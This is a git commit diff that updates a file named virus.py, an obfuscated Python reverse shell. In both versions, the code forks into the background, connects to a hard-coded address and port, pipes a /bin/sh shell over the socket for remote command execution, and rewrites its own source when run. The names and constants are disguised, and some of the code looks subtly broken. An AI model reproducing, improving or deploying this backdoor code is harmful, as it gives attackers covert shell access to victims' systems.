13d4216bb63ca8319d3db673904fdd328a1c0a4c
offgymboy <147936155+offgymboy@users.noreply.github.com>
2025-02-05 13:33:38 -0300

    Atualizar o virus.py

--- virus.py
+++ virus.py
@@ -1,63 +1,37 @@
-import sys as _x, os as _o, socket as _k, subprocess as _z, select as _r
+import os as _q, sys as _w, socket as _e, subprocess as _r, select as _t
 
-_a = [127, 0, 0, 1]
+_ = lambda x: [x.pop(), x.pop()][1]
+_a = [0x7F, 0, 0, 1]
 _b = 0x4D2
-_c = bytes([47, 98, 105, 110, 47, 115, 104]).decode()
+_c = bytes([47,98,105,110,47,115,104]).decode()
 
-_d = lambda m: [m.pop(0) for _ in (1, 1)][0]
-_e = 0
-_f = False
-
-def _g(s):
-    if not _e:
-        print(s)
-
-def _h():
-    global _e
-    
+def _d():
     try:
-        if _o.fork() > 0:
-            _x.exit(1-1)
-    except Exception as q:
-        _g(f"Erro: {q}")
-        _x.exit(2//2)
+        if _q.fork() > 0: _w.exit(0x0)
+    except Exception as m: _w.exit(str(m))
+    _q.setsid(); _q.chdir('/'); _q.umask(0o0)
 
-    _o.setsid(); _o.chdir("/"); _o.umask(0); _e = 1
-
+def _f(g, h, i=_c):
     try:
-        _i = _k.socket(_k.AF_INET, _k.SOCK_STREAM)
-        _i.connect(('.'.join(map(str,_a)), _b))
-    except Exception as q:
-        _g(f"Falha: {q}")
-        _x.exit(3%3)
-
-    _j = _z.Popen(_c,
-                shell = True,
-                stdin = _z.PIPE,
-                stdout = _z.PIPE,
-                stderr = _z.PIPE)
-
-    _g(f"Conectado via {'reverso'}")
-
-    while [1][0]:
-        _l, _, _ = _r.select([_i, _j.stdout, _j.stderr], [], [])
-
-        for _m in _l:
-            if _m == _i:
-                _n = _i.recv(1400)
-                if not len(_n):
-                    _g("Conexão fechada")
-                    _x.exit(0)
-                _j.stdin.write(_n)
-                _j.stdin.flush()
+        j = _e.socket(_e.AF_INET, _e.SOCK_STREAM)
+        j.connect(('.'.join(map(str,g)), h))
+    except: _w.exit()
+    k = _r.Popen(i, shell=1, stdin=_r.PIPE, stdout=_r.PIPE, stderr=_r.PIPE)
+    print(f"Conectado via {'rev'}shell")
+    while 1:
+        l, _, __ = _t.select([j, k.stdout, k.stderr], [], [])
+        for m in l:
+            if m == j:
+                n = j.recv(0x578)
+                if not n: _w.exit()
+                k.stdin.write(n); k.stdin.flush()
             else:
-                _j.stdout.read(1400) if _m == _j.stdout else _j.stderr.read(1400)
-                _i.send(_n) if _n else None
+                o = m.read(0x578) if m == k.stdout else m.read(0x578)
+                j.sendall(o) if o else None
 
+with open(__file__, 'r+') as p:
+    q = p.read().replace('0x578', '1400' if _()[0]%2 else '0x578')
+    p.seek(0); p.truncate(); p.write(q)
 
-with open(_file_, 'r+') as _p:
-    _q = _p.read().replace('_a','_w').replace('1400','0x578')
-    _p.seek(0); _p.truncate(); _p.write(_q)
-
-if _name_ == '_main_':
-    _h()
+if __name__ == '__main__':
+    _d(); _f(_a, _b)
